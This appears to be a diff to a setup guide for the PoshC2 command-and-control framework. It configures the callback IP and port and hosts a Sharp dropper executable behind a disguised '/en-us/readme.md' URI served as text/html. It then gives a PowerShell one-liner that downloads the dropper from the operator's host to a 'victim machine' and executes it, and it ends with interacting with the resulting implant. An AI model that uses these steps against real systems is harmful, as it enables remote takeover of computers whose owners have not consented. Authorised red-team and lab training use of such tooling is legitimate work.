@@ -39,7 +39,8 @@ Edit the configuration for your project:
 ```
 posh-config
 ```
-Edit `payloadcoms` to your ip
+Edit `payloadcoms` to your ip  
+Also edit Bindport form 443 to 80
 
 Launch the PoshC2 server:
 ```
@@ -66,10 +67,10 @@ add-hosted-file
 
 Host file opttions 
 ```
-file location > /home/parrot/file.exe
+file location > /var/poschc2/yourprojectname/payloads/Sharp_v4_dropper_x64.exe
 file uri > /en-us/readme.md
 file MIME type > text/html
-Base64 > y/n
+Base64 > n
 ```
 
 View all hosted files by running
@@ -81,7 +82,7 @@ show-hosted-files
 
 For testing lets downloading using powershell on victim machine usign a basic user
 ```powershell
-iwr -uri http://<youripordomian>/hosteduritring -outfile C:\windows\temp\bad.exe && C:\windows\temp\bad.exe
+iwr -uri http://<youripordomian>/hosteduritring -outfile C:\windows\temp\bad.exe; C:\windows\temp\bad.exe
 ```
 
 Interact with implant by typeing `1` in ImplantHandler
